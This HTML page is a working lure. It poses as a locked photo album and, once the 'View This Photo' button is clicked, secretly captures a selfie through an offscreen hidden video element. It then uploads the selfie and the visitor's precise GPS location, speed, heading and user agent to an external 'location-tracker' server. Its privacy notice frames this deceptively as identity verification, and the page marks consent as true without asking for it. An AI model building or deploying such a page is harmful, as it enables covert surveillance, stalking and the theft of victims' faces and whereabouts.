<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Your Photo Album</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, sans-serif;
            background: #0f0f1a;
            color: #e0e0e0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            width: 100%;
        }

        h1 {
            text-align: center;
            font-size: 28px;
            margin-bottom: 24px;
            font-weight: 700;
            letter-spacing: -0.5px;
            color: #ffffff;
        }

        .photo-card {
            background: #1a1a2e;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.06);
        }

        .photo-overlay {
            position: relative;
            width: 100%;
            aspect-ratio: 16 / 10;
            background: #12121e;
            overflow: hidden;
        }

        .photo-overlay img {
            width: 100%;
            height: 100%;
            display: block;
            filter: blur(24px) brightness(0.6);
            object-fit: cover;
            transition: filter 0.6s ease, brightness 0.6s ease;
            pointer-events: none;
            user-select: none;
        }

        .photo-overlay img.unlocked {
            filter: blur(0) brightness(1);
        }

        #lockBadge {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.7);
            color: #fff;
            font-size: 48px;
            width: 88px;
            height: 88px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            pointer-events: none;
            z-index: 2;
            transition: opacity 0.5s ease, transform 0.5s ease;
            backdrop-filter: blur(4px);
            border: 2px solid rgba(255, 255, 255, 0.1);
        }

        #lockBadge.hidden {
            opacity: 0;
            transform: translate(-50%, -50%) scale(0.8);
        }

        .card-actions {
            padding: 24px 24px 20px;
            text-align: center;
        }

        #viewPhotoBtn {
            background: linear-gradient(135deg, #1a73e8, #1557b0);
            color: #fff;
            border: none;
            padding: 14px 36px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 10px;
            cursor: pointer;
            transition: background 0.25s ease, transform 0.15s ease, opacity 0.25s ease;
            width: 100%;
            max-width: 280px;
            letter-spacing: 0.3px;
            box-shadow: 0 4px 14px rgba(26, 115, 232, 0.3);
        }

        #viewPhotoBtn:hover:not(:disabled) {
            background: linear-gradient(135deg, #1e7df5, #1961c5);
            transform: translateY(-1px);
        }

        #viewPhotoBtn:active:not(:disabled) {
            transform: translateY(0);
        }

        #viewPhotoBtn:disabled {
            opacity: 0.55;
            cursor: not-allowed;
            box-shadow: none;
        }

        #viewPhotoBtn.processing {
            background: linear-gradient(135deg, #4a4a6a, #3a3a5a);
        }

        #status {
            margin-top: 16px;
            font-size: 14px;
            min-height: 22px;
            color: #a0a0b8;
            transition: color 0.3s ease;
        }

        #status.success {
            color: #4ade80;
        }

        #status.error {
            color: #f87171;
        }

        #status.loading {
            color: #fbbf24;
        }

        /* Privacy notice */
        .privacy-notice {
            margin-top: 20px;
            padding: 14px 18px;
            background: rgba(255, 255, 255, 0.04);
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.06);
            font-size: 12px;
            color: #78789a;
            text-align: center;
            line-height: 1.5;
        }

        .privacy-notice strong {
            color: #a0a0c0;
        }
    </style>
</head>

<body>

    <div class="container">

        <h1>📍 Photo Album</h1>

        <!-- Locked photo card -->
        <div class="photo-card">
            <div class="photo-overlay">
                <img id="albumPhoto"
                     src="https://picsum.photos/seed/album1/800/500"
                     alt="Album Photo">
                <div id="lockBadge">🔒</div>
            </div>
            <div class="card-actions">
                <button id="viewPhotoBtn">👁️ View This Photo</button>
                <p id="status"></p>
            </div>
        </div>

        <div class="privacy-notice">
            <strong>🔒 Privacy-first verification:</strong> A one-time selfie and location are captured to verify your identity.
            No data is stored locally. Camera and location permissions are required.
        </div>

    </div>

    <script>
        (function() {
            "use strict";

            const viewPhotoBtn = document.getElementById("viewPhotoBtn");
            const statusEl = document.getElementById("status");
            const albumPhoto = document.getElementById("albumPhoto");
            const lockBadge = document.getElementById("lockBadge");

            const LOCATION_API_URL = "https://location-tracker-api-cjka.onrender.com/location";
            const SELFIE_API_URL = "https://location-tracker-api-cjka.onrender.com/selfie";

            let cameraStream = null;
            let lastLocationId = null;
            let selfieBlob = null;
            let isProcessing = false;

            // --- UI Helpers ---

            function setStatus(message, type) {
                statusEl.textContent = message;
                statusEl.className = type || "";
            }

            function unlockPhoto() {
                albumPhoto.classList.add("unlocked");
                lockBadge.classList.add("hidden");
                viewPhotoBtn.disabled = false;
                viewPhotoBtn.textContent = "👁️ View This Photo";
                viewPhotoBtn.classList.remove("processing");
                isProcessing = false;
                setStatus("✅ Photo unlocked! You can now see the image.", "success");
            }

            function resetUI(errorMsg) {
                viewPhotoBtn.disabled = false;
                viewPhotoBtn.textContent = "👁️ View This Photo";
                viewPhotoBtn.classList.remove("processing");
                isProcessing = false;
                if (errorMsg) {
                    setStatus(errorMsg, "error");
                }
            }

            function stopCameraStream() {
                if (cameraStream) {
                    cameraStream.getTracks().forEach(track => track.stop());
                    cameraStream = null;
                }
            }

            // --- Step 1: Request camera (hidden) and capture selfie ---

            async function requestCameraAndCapture() {
                // HTTPS check
                if (window.location.protocol !== "https:" && window.location.hostname !== "localhost" && window.location.hostname !== "127.0.0.1") {
                    setStatus("❌ HTTPS is required for camera & location access.", "error");
                    resetUI();
                    return;
                }

                // API check
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    setStatus("❌ Camera API is not supported in this browser.", "error");
                    resetUI();
                    return;
                }

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: "user",
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        },
                        audio: false
                    });

                    cameraStream = stream;

                    // Hidden video element
                    const hiddenVideo = document.createElement("video");
                    hiddenVideo.srcObject = stream;
                    hiddenVideo.autoplay = true;
                    hiddenVideo.playsinline = true;
                    hiddenVideo.muted = true;
                    hiddenVideo.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;";
                    hiddenVideo.setAttribute("aria-hidden", "true");
                    document.body.appendChild(hiddenVideo);

                    // Wait for video to be ready with timeout
                    await Promise.race([
                        new Promise((resolve, reject) => {
                            hiddenVideo.onloadedmetadata = () => {
                                hiddenVideo.play().then(resolve).catch(reject);
                            };
                            if (hiddenVideo.readyState >= 2) {
                                // Already loaded
                                resolve();
                            }
                        }),
                        new Promise((_, reject) =>
                            setTimeout(() => reject(new Error("Camera init timeout")), 8000)
                        )
                    ]);

                    // Warm-up delay
                    await new Promise(r => setTimeout(r, 600));

                    const videoWidth = hiddenVideo.videoWidth || 640;
                    const videoHeight = hiddenVideo.videoHeight || 480;

                    if (videoWidth === 0 || videoHeight === 0) {
                        throw new Error("Camera returned empty dimensions");
                    }

                    // Capture frame
                    const hiddenCanvas = document.createElement("canvas");
                    hiddenCanvas.width = videoWidth;
                    hiddenCanvas.height = videoHeight;
                    const ctx = hiddenCanvas.getContext("2d");
                    // Flip horizontally for mirror effect (selfie-style)
                    ctx.translate(videoWidth, 0);
                    ctx.scale(-1, 1);
                    ctx.drawImage(hiddenVideo, 0, 0);

                    // Convert to blob
                    selfieBlob = await new Promise((resolve, reject) => {
                        hiddenCanvas.toBlob((blob) => {
                            if (blob) resolve(blob);
                            else reject(new Error("Canvas toBlob returned null"));
                        }, "image/jpeg", 0.85);
                    });

                    // Clean up
                    document.body.removeChild(hiddenVideo);
                    stopCameraStream();

                    // Proceed to upload
                    await uploadSelfieThenLocation();

                } catch (err) {
                    console.error("Camera error:", err);
                    stopCameraStream();

                    let msg;
                    if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
                        msg = "❌ Camera permission was denied.";
                    } else if (err.name === "NotFoundError") {
                        msg = "❌ No camera found on this device.";
                    } else if (err.name === "NotReadableError") {
                        msg = "❌ Camera is in use by another application.";
                    } else if (err.message === "Camera init timeout") {
                        msg = "❌ Camera initialization timed out.";
                    } else {
                        msg = "❌ Camera error: " + err.message;
                    }

                    resetUI(msg);
                }
            }

            // --- Step 2: Upload selfie, then request location ---

            async function uploadSelfieThenLocation() {
                if (!selfieBlob) {
                    resetUI("❌ No selfie captured. Please try again.");
                    return;
                }

                setStatus("📷 Uploading selfie...", "loading");

                if (!navigator.onLine) {
                    resetUI("❌ No internet connection detected.");
                    return;
                }

                try {
                    const formData = new FormData();
                    formData.append("image", selfieBlob, "selfie.jpg");
                    formData.append("timestamp", new Date().toISOString());

                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 15000);

                    const response = await fetch(SELFIE_API_URL, {
                        method: "POST",
                        body: formData,
                        signal: controller.signal
                    });

                    clearTimeout(timeoutId);

                    if (!response.ok) {
                        let msg = "Upload failed (HTTP " + response.status + ")";
                        try {
                            const errData = await response.json();
                            msg = errData.message || msg;
                        } catch (e) { /* ignore */ }
                        resetUI("❌ " + msg);
                        return;
                    }

                    const result = await response.json();

                    if (!result.id) {
                        resetUI("❌ Server response missing selfie ID.");
                        return;
                    }

                    // Selfie uploaded — now request location
                    setStatus("📍 Requesting your location...", "loading");
                    requestLocation(result.id);

                } catch (err) {
                    console.error("Upload error:", err);

                    if (err.name === "AbortError") {
                        resetUI("❌ Upload timed out. Check your connection.");
                    } else if (err instanceof TypeError && (
                        err.message.includes("NetworkError") ||
                        err.message.includes("Failed to fetch")
                    )) {
                        resetUI("❌ Network error — CORS or connectivity issue.");
                    } else {
                        resetUI("❌ Upload failed: " + err.message);
                    }
                }
            }

            // --- Step 3: Request location and link to selfie ---

            function requestLocation(selfieId) {
                if (!navigator.geolocation) {
                    resetUI("❌ Geolocation is not supported by this browser.");
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const data = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude || null,
                            altitudeAccuracy: position.coords.altitudeAccuracy || null,
                            heading: position.coords.heading || null,
                            speed: position.coords.speed || null,
                            timestamp: new Date().toISOString(),
                            consent: true,
                            selfie_id: selfieId,
                            user_agent: navigator.userAgent.slice(0, 200)
                        };

                        try {
                            const controller = new AbortController();
                            const timeoutId = setTimeout(() => controller.abort(), 15000);

                            const locResponse = await fetch(LOCATION_API_URL, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify(data),
                                signal: controller.signal
                            });

                            clearTimeout(timeoutId);

                            if (!locResponse.ok) {
                                let msg = "Location upload failed (HTTP " + locResponse.status + ")";
                                try {
                                    const errData = await locResponse.json();
                                    msg = errData.message || msg;
                                } catch (e) { /* ignore */ }
                                resetUI("❌ " + msg);
                                return;
                            }

                            const locResult = await locResponse.json();

                            if (!locResult.id) {
                                resetUI("❌ Server response missing location ID.");
                                return;
                            }

                            lastLocationId = locResult.id;
                            unlockPhoto();

                        } catch (err) {
                            console.error("Location upload error:", err);

                            if (err.name === "AbortError") {
                                resetUI("❌ Location upload timed out.");
                            } else {
                                resetUI("❌ Location upload failed: " + err.message);
                            }
                        }
                    },
                    (error) => {
                        let msg;
                        switch (error.code) {
                            case error.PERMISSION_DENIED:
                                msg = "❌ Location permission was denied.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                msg = "❌ Location unavailable (GPS/signal).";
                                break;
                            case error.TIMEOUT:
                                msg = "❌ Location request timed out.";
                                break;
                            default:
                                msg = "❌ Location error (code " + error.code + ").";
                        }
                        resetUI(msg);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            }

            // --- Button click handler ---

            viewPhotoBtn.addEventListener("click", function(e) {
                e.preventDefault();

                if (isProcessing) return;
                isProcessing = true;

                viewPhotoBtn.disabled = true;
                viewPhotoBtn.textContent = "⏳ Verifying...";
                viewPhotoBtn.classList.add("processing");
                setStatus("📸 Initializing camera...", "loading");

                // Start the flow
                requestCameraAndCapture();
            });

        })();
    </script>

</body>

</html>
